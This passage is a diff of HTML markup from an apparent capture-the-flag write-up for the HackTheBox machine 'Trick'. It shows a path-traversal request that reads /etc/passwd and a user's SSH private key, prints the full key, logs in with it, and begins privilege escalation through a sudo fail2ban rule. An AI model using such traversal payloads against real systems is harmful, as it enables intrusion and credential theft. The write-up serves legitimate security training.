+<span class="normal"><a href="#__codelineno-33-31">31</a></span>
+<span class="normal"><a href="#__codelineno-33-32">32</a></span>
+<span class="normal"><a href="#__codelineno-33-33">33</a></span>
+<span class="normal"><a href="#__codelineno-33-34">34</a></span>
+<span class="normal"><a href="#__codelineno-33-35">35</a></span>
+<span class="normal"><a href="#__codelineno-33-36">36</a></span>
+<span class="normal"><a href="#__codelineno-33-37">37</a></span>
+<span class="normal"><a href="#__codelineno-33-38">38</a></span>
+<span class="normal"><a href="#__codelineno-33-39">39</a></span>
+<span class="normal"><a href="#__codelineno-33-40">40</a></span>
+<span class="normal"><a href="#__codelineno-33-41">41</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a>root:x:0:0:root:/root:/bin/bash
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5"></a>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15"></a>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16"></a>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17"></a>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span><span id="__span-33-18"><a id="__codelineno-33-18" name="__codelineno-33-18"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span><span id="__span-33-19"><a id="__codelineno-33-19" name="__codelineno-33-19"></a>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span><span id="__span-33-20"><a id="__codelineno-33-20" name="__codelineno-33-20"></a>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span><span id="__span-33-21"><a id="__codelineno-33-21" name="__codelineno-33-21"></a>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span><span id="__span-33-22"><a id="__codelineno-33-22" name="__codelineno-33-22"></a>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span><span id="__span-33-23"><a id="__codelineno-33-23" name="__codelineno-33-23"></a>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span><span id="__span-33-24"><a id="__codelineno-33-24" name="__codelineno-33-24"></a>tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+</span><span id="__span-33-25"><a id="__codelineno-33-25" name="__codelineno-33-25"></a>dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span><span id="__span-33-26"><a id="__codelineno-33-26" name="__codelineno-33-26"></a>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span><span id="__span-33-27"><a id="__codelineno-33-27" name="__codelineno-33-27"></a>rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+</span><span id="__span-33-28"><a id="__codelineno-33-28" name="__codelineno-33-28"></a>pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+</span><span id="__span-33-29"><a id="__codelineno-33-29" name="__codelineno-33-29"></a>speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+</span><span id="__span-33-30"><a id="__codelineno-33-30" name="__codelineno-33-30"></a>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+</span><span id="__span-33-31"><a id="__codelineno-33-31" name="__codelineno-33-31"></a>saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
+</span><span id="__span-33-32"><a id="__codelineno-33-32" name="__codelineno-33-32"></a>colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span><span id="__span-33-33"><a id="__codelineno-33-33" name="__codelineno-33-33"></a>geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
+</span><span id="__span-33-34"><a id="__codelineno-33-34" name="__codelineno-33-34"></a>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span><span id="__span-33-35"><a id="__codelineno-33-35" name="__codelineno-33-35"></a>Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+</span><span id="__span-33-36"><a id="__codelineno-33-36" name="__codelineno-33-36"></a>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span><span id="__span-33-37"><a id="__codelineno-33-37" name="__codelineno-33-37"></a>mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
+</span><span id="__span-33-38"><a id="__codelineno-33-38" name="__codelineno-33-38"></a>sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
+</span><span id="__span-33-39"><a id="__codelineno-33-39" name="__codelineno-33-39"></a>postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
+</span><span id="__span-33-40"><a id="__codelineno-33-40" name="__codelineno-33-40"></a>bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
+</span><span id="__span-33-41"><a id="__codelineno-33-41" name="__codelineno-33-41"></a>michael:x:1001:1001::/home/michael:/bin/bash
+</span></code></pre></div></td></tr></table></div>
 <p>Now, we can infer somehow that in /home/michael we can find a .ssh folder with teh id_rsa public ssh signature. To download it, we can use burp and capture this petition:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1"></a>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
+</span></code></pre></div></td></tr></table></div>
 <p>As a result, we can download michael's public key to login via ssh:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>HTTP/1.1 200 OK
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>Server: nginx/1.14.2
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>Date: Thu, 20 Oct 2022 08:25:41 GMT
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>Content-Type: text/html; charset=UTF-8
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>Connection: close
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>Content-Length: 1823
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>
-</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>-----BEGIN OPENSSH PRIVATE KEY-----
-</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
-</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
-</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
-</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
-</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
-</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
-</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
-</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
-</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
-</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
-</span><span id="__span-35-19"><a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
-</span><span id="__span-35-20"><a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
-</span><span id="__span-35-21"><a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
-</span><span id="__span-35-22"><a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
-</span><span id="__span-35-23"><a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
-</span><span id="__span-35-24"><a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
-</span><span id="__span-35-25"><a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
-</span><span id="__span-35-26"><a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
-</span><span id="__span-35-27"><a id="__codelineno-35-27" name="__codelineno-35-27" href="#__codelineno-35-27"></a>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
-</span><span id="__span-35-28"><a id="__codelineno-35-28" name="__codelineno-35-28" href="#__codelineno-35-28"></a>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
-</span><span id="__span-35-29"><a id="__codelineno-35-29" name="__codelineno-35-29" href="#__codelineno-35-29"></a>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
-</span><span id="__span-35-30"><a id="__codelineno-35-30" name="__codelineno-35-30" href="#__codelineno-35-30"></a>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
-</span><span id="__span-35-31"><a id="__codelineno-35-31" name="__codelineno-35-31" href="#__codelineno-35-31"></a>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
-</span><span id="__span-35-32"><a id="__codelineno-35-32" name="__codelineno-35-32" href="#__codelineno-35-32"></a>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
-</span><span id="__span-35-33"><a id="__codelineno-35-33" name="__codelineno-35-33" href="#__codelineno-35-33"></a>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-</span><span id="__span-35-34"><a id="__codelineno-35-34" name="__codelineno-35-34" href="#__codelineno-35-34"></a>-----END OPENSSH PRIVATE KEY-----
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-35-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-35-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-35-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-35-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-35-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-35-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-35-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-35-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-35-10">10</a></span>
+<span class="normal"><a href="#__codelineno-35-11">11</a></span>
+<span class="normal"><a href="#__codelineno-35-12">12</a></span>
+<span class="normal"><a href="#__codelineno-35-13">13</a></span>
+<span class="normal"><a href="#__codelineno-35-14">14</a></span>
+<span class="normal"><a href="#__codelineno-35-15">15</a></span>
+<span class="normal"><a href="#__codelineno-35-16">16</a></span>
+<span class="normal"><a href="#__codelineno-35-17">17</a></span>
+<span class="normal"><a href="#__codelineno-35-18">18</a></span>
+<span class="normal"><a href="#__codelineno-35-19">19</a></span>
+<span class="normal"><a href="#__codelineno-35-20">20</a></span>
+<span class="normal"><a href="#__codelineno-35-21">21</a></span>
+<span class="normal"><a href="#__codelineno-35-22">22</a></span>
+<span class="normal"><a href="#__codelineno-35-23">23</a></span>
+<span class="normal"><a href="#__codelineno-35-24">24</a></span>
+<span class="normal"><a href="#__codelineno-35-25">25</a></span>
+<span class="normal"><a href="#__codelineno-35-26">26</a></span>
+<span class="normal"><a href="#__codelineno-35-27">27</a></span>
+<span class="normal"><a href="#__codelineno-35-28">28</a></span>
+<span class="normal"><a href="#__codelineno-35-29">29</a></span>
+<span class="normal"><a href="#__codelineno-35-30">30</a></span>
+<span class="normal"><a href="#__codelineno-35-31">31</a></span>
+<span class="normal"><a href="#__codelineno-35-32">32</a></span>
+<span class="normal"><a href="#__codelineno-35-33">33</a></span>
+<span class="normal"><a href="#__codelineno-35-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2"></a>Server: nginx/1.14.2
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3"></a>Date: Thu, 20 Oct 2022 08:25:41 GMT
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4"></a>Content-Type: text/html; charset=UTF-8
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5"></a>Connection: close
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6"></a>Content-Length: 1823
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7"></a>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8"></a>-----BEGIN OPENSSH PRIVATE KEY-----
+</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10"></a>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11"></a>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12"></a>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13"></a>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14"></a>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15"></a>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16"></a>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17"></a>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18"></a>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+</span><span id="__span-35-19"><a id="__codelineno-35-19" name="__codelineno-35-19"></a>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+</span><span id="__span-35-20"><a id="__codelineno-35-20" name="__codelineno-35-20"></a>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+</span><span id="__span-35-21"><a id="__codelineno-35-21" name="__codelineno-35-21"></a>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+</span><span id="__span-35-22"><a id="__codelineno-35-22" name="__codelineno-35-22"></a>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+</span><span id="__span-35-23"><a id="__codelineno-35-23" name="__codelineno-35-23"></a>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+</span><span id="__span-35-24"><a id="__codelineno-35-24" name="__codelineno-35-24"></a>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+</span><span id="__span-35-25"><a id="__codelineno-35-25" name="__codelineno-35-25"></a>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+</span><span id="__span-35-26"><a id="__codelineno-35-26" name="__codelineno-35-26"></a>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+</span><span id="__span-35-27"><a id="__codelineno-35-27" name="__codelineno-35-27"></a>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+</span><span id="__span-35-28"><a id="__codelineno-35-28" name="__codelineno-35-28"></a>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+</span><span id="__span-35-29"><a id="__codelineno-35-29" name="__codelineno-35-29"></a>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+</span><span id="__span-35-30"><a id="__codelineno-35-30" name="__codelineno-35-30"></a>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+</span><span id="__span-35-31"><a id="__codelineno-35-31" name="__codelineno-35-31"></a>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+</span><span id="__span-35-32"><a id="__codelineno-35-32" name="__codelineno-35-32"></a>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+</span><span id="__span-35-33"><a id="__codelineno-35-33" name="__codelineno-35-33"></a>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+</span><span id="__span-35-34"><a id="__codelineno-35-34" name="__codelineno-35-34"></a>-----END OPENSSH PRIVATE KEY-----
+</span></code></pre></div></td></tr></table></div>
 <p>Now we save it with the name we want and change its permissions:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>nano<span class="w"> </span>key
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="c1"># CTRl-MAY V to paste it</span>
-</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="c1"># CTRL-X, Yes and ENTER to save the buffer and exit</span>
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span>key
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span>
+<span class="normal"><a href="#__codelineno-36-2">2</a></span>
+<span class="normal"><a href="#__codelineno-36-3">3</a></span>
+<span class="normal"><a href="#__codelineno-36-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1"></a>nano<span class="w"> </span>key
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2"></a><span class="c1"># CTRl-MAY V to paste it</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3"></a><span class="c1"># CTRL-X, Yes and ENTER to save the buffer and exit</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span>key
+</span></code></pre></div></td></tr></table></div>
 <p>And we can login as michael:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>michael@10.10.11.166
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1"></a>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>michael@10.10.11.166
+</span></code></pre></div></td></tr></table></div>
 <p>In /home/michael we have the user flag: user.txt.</p>
 <h3 id="escalation-of-privileges">Escalation of privileges</h3>
 <p>Getting the system flag.
 Check michael's groups:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>id
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1"></a>id
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-39-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1"></a>uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+</span></code></pre></div></td></tr></table></div>
 <p>Check michael's permissions:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>sudo<span class="w"> </span>-l
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-40-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1"></a>sudo<span class="w"> </span>-l
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>Matching Defaults entries for michael on trick:
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>    env_reset, mail_badpass,
-</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>
-</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>User michael may run the following commands on trick:
-</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>    (root) NOPASSWD: /etc/init.d/fail2ban restart
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1">1</a></span>
+<span class="normal"><a href="#__codelineno-41-2">2</a></span>
+<span class="normal"><a href="#__codelineno-41-3">3</a></span>
